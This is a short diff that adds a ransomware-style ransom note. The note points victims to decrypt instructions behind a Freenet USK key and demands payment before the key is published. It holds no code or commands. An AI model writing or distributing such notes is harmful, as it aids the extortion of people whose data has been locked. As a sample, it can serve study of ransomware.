@@ -1,0 +1,4 @@
+Recovery instructions are mirrored on Freenet.
+Fetch the decrypt instructions key:
+USK@2LIBGHU5SDAZ67MVK3YRbghu5sdaz67mvk3yrwxenctqjKLMNOPqrst/notes/3
+A ransom must be paid before the key is published.
